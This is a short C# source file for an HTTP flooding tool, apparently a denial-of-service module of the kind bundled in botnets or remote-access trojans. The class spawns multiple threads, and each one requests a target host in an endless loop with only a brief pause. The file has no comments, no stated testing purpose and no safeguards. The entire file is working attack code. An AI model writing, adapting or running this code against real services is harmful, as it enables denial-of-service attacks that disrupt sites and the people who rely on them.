using System;
using System.Net;
using System.Threading;

internal class HttpFlood
{
    private ThreadStart[] FloodingJob;
    private Thread[] FloodingThread;
    public string Host;
    public int Interval = 20;
    public bool IsEnabled;
    private HttpRequest[] RequestClass;
    public int Threads = 10;

    public void StartHttpFlood()
    {
        this.FloodingThread = new Thread[this.Threads];
        this.FloodingJob = new ThreadStart[this.Threads];
        this.RequestClass = new HttpRequest[this.Threads];
        for (int i = 0; i < this.Threads; i++)
        {
            this.RequestClass[i] = new HttpRequest(this.Host, this.Interval);
            this.FloodingJob[i] = new ThreadStart(this.RequestClass[i].Send);
            this.FloodingThread[i] = new Thread(this.FloodingJob[i]);
            this.FloodingThread[i].Start();
        }
        this.IsEnabled = true;
    }

    public void StopHttpFlood()
    {
        for (int i = 0; i < this.Threads; i++)
        {
            try
            {
                this.FloodingThread[i].Abort();
                this.FloodingThread[i] = null;
                this.FloodingJob[i] = null;
                this.RequestClass[i] = null;
            }
            catch
            {
            }
        }
        this.IsEnabled = false;
    }

    private class HttpRequest
    {
        private string Host;
        private WebClient Http = new WebClient();
        private int Interval;

        public HttpRequest(string Host, int Interval)
        {
            this.Host = Host;
            this.Interval = Interval;
        }

        public void Send()
        {
            while (true)
            {
                try
                {
                    this.Http.DownloadString(this.Host);
                    Thread.Sleep(this.Interval);
                }
                catch
                {
                    Thread.Sleep(this.Interval);
                }
            }
        }
    }
}

